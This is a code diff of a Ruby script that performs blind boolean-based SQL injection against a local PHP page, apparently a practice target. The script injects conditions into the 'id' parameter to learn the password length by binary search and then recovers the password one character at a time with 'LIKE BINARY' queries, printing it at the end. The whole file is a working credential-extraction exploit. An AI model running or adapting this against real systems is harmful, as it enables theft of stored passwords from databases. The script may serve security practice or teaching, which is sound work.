@@ -1,5 +1,9 @@
 require 'open-uri'
 require 'pp'
+require_relative './uri_encode_component'
+
+
+USER_ID = ARGV[0] || 1
 
 def guess_val max
     current_max = max
@@ -17,38 +21,44 @@ def guess_val max
     current_min
 end
 
+@request_count = 0
+
 def request_val id_sql_val
-    URI.open("http://localhost:1234/active.php?id=#{id_sql_val}").read.include? 'is active'
+    @request_count+=1;
+    # puts 'sql req: ' + id_sql_val
+    res = URI.open("http://localhost:1234/active.php?id=#{encodeURIComponent(id_sql_val)}").read
+    return nil if res.include? 'error'
+    (res.include? 'is active') || (res.include? 'suspended')
 end
 
 #code:
 mdp_length = guess_val(50){ |comp|
-    request_val "3 AND length(password) < #{comp}" 
+    request_val "#{USER_ID} AND length(password) < #{comp}" 
 }
 puts "mdp_length: #{mdp_length}"
 
-password_binary_number = guess_val(mdp_length * 32){ |comp|
-    request_val "3 AND BINARY password < BINARY #{comp}"
-}
-puts "password number #{password_binary_number}"
-# bytesfield = []
-# password_binary_number.bit_length.times do |bit_ind|
-#     num_ind = password_binary_number.bit_length - cur - 1
-#     bytesfield[bit_ind/8] += password_binary_number[num_ind] * 2**()
-# end
+SQL_ESCAPE_CHARS = '%_$\''
+current_password = ""
+mdp_length.times do |index|
+    break if current_password.bytesize >= mdp_length
+    (0..).each do |char_ind|
+        char = char_ind.chr(Encoding::UTF_8)
+        escaped_char = (SQL_ESCAPE_CHARS.include? char)?('\\' + char) : char
+        #visual progression
+        print "\r#{current_password}#{char.sub(/[^[:print:]]/, ' ')}";
 
+        if request_val "#{USER_ID} AND password LIKE BINARY '#{current_password}#{escaped_char}%'"
+            current_password = current_password + char
+            break
+        end
+    end
+end
+puts
+puts "password: #{current_password}";
+puts "with #{@request_count} requests";
 
-# def guess_val_incr
-#     min_val = 1
-#     max_val = nil
-#     loop do
-        
-#         is_smaller_than = yield
-#         if is_smaller_than
-#             max_val = 
-#     end
-# end
-
-puts guess_val(100){ |comp|
-    22 < comp
-}
+# BINARY WAY THAT DOESN'T WORK AT ALL
+# password_binary_number = guess_val(mdp_length * 32){ |comp|
+#     request_val "3 AND BINARY password < BINARY #{comp}"
+# }
+# puts "password number #{password_binary_number}"
